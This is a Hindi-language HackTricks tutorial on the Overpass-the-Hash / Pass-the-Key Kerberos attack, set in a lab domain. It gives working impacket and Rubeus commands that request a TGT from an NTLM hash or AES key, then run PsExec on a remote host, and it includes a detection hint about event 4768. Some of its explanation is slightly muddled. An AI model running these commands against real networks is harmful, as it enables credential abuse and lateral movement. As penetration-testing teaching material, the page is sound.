# ओवर पास द हैश/पास द की (PTK)

यह हमला **उपयोगकर्ता NTLM हैश या AES कुंजी का उपयोग करके केरबेरोस टिकट का अनुरोध करने** का उद्देश्य रखता है, सामान्यतः NTLM प्रोटोकॉल पर पास द हैश के स्थानांतरण के विकल्प के रूप में। इसलिए, यह विशेष रूप से **उपयोगी हो सकता है जहां NTLM प्रोटोकॉल अक्षम है** और केवल **केरबेरोस को प्रमाणित करने की अनुमति है**।

इस हमले को करने के लिए, **लक्षित उपयोगकर्ता खाते का NTLM हैश (या पासवर्ड) चाहिए**। इसलिए, एक उपयोगकर्ता हैश प्राप्त करने के बाद, उस खाते के लिए एक TGT अनुरोध किया जा सकता है। अंत में, यह संभव होता है कि किसी भी सेवा या मशीन तक पहुंचा जा सके जहां **उपयोगकर्ता खाते की अनुमति होती है**।
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
आप **विशिष्ट** करने के लिए `-aesKey [AES कुंजी]` निर्दिष्ट कर सकते हैं कि **AES256** का उपयोग करें।\
आप टिकट का उपयोग अन्य उपकरणों के साथ भी कर सकते हैं, जैसे: smbexec.py या wmiexec.py

संभावित समस्याएं:

* _PyAsn1Error('NamedTypes can cast only scalar values',)_ : नवीनतम संस्करण में impacket को अपडेट करके हल हो जाती है।
* _KDC नाम नहीं मिला_ : Kerberos KDC द्वारा मान्यता प्राप्त नहीं होने के कारण, IP पते के बजाय होस्टनाम का उपयोग करके हल हो जाती है।
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
यह प्रकार का हमला **पास द की** के समान है, लेकिन हैश का उपयोग करके टिकट का अनुरोध करने की बजाय, टिकट स्वयं चोरी किया जाता है और इसका उपयोग अपने मालिक के रूप में प्रमाणित करने के लिए किया जाता है।

{% hint style="warning" %}
जब एक TGT का अनुरोध किया जाता है, तो घटना `4768: एक केरबेरोस प्रमाणीकरण टिकट (TGT) का अनुरोध किया गया था` उत्पन्न होती है। आप ऊपर के आउटपुट से देख सकते हैं कि KeyType **RC4-HMAC** (0x17) है, लेकिन Windows के लिए डिफ़ॉल्ट प्रकार अब **AES256** (0x12) है।
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## संदर्भ

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family) का पता लगाएं
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>
